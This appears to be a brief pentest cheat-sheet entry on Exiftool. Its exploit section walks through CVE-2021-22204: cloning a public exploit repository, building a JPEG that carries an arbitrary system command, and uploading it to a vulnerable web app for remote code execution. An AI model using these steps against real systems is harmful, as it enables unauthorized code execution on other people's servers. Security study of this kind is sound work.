## Definition
__Exiftool__ is a tool that allows you to retrieve the metadata from an image.

## Usage
This program has several uses:
- `exiftool {FILE}` - It's the most simple use of the tool

## Way to exploit it
__Exiftool__ can be exploited in order to gain RCE (if the web application has a feature of uploading image and the application parse the metadata of the uploaded image file using exiftool) (CVE-2021-22204) by doing the following steps:
- First you've to clone the repository of the exploit using `git clone https://github.com/OneSecCyber/JPEG_RCE.git`
- Secondly you've to get into the JPEG_RCE directory and execute `exiftool -config eval.config runme.jpg -eval='system("{COMMAND}")'`
- Lastly you have to upload the file previously created (`runme.jpg`) and you'll see the magic
#Resource: https://github.com/OneSecCyber/JPEG_RCE